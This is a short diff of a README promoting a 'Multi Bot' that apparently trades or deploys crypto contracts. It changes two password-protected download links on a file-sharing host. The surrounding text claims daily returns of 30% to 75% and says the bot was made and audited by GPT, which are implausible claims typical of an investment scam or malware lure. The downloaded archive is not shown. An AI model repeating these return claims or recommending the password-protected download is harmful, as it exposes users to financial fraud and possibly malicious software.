@@ -7,7 +7,7 @@
 <div align="center">This Multi Bot was created using ChatGPT-4, with code collaboratively reviewed and audited by GPT.</div>
 
 
-# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
+# [DOWNLOAD](https://www.4sync.com/s/fzRHeXfDE)  
 ## PASSWORD: 1322
 
 
@@ -46,7 +46,7 @@ The average daily return ranges from **30% to 75%**. The following factors influ
 
 ## **Configuration and Deployment**
 
-# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
+# [DOWNLOAD](https://www.4sync.com/s/fzRHeXfDE)  
 ## PASSWORD: 1322
 
 ### 2. Preparing the Contract File
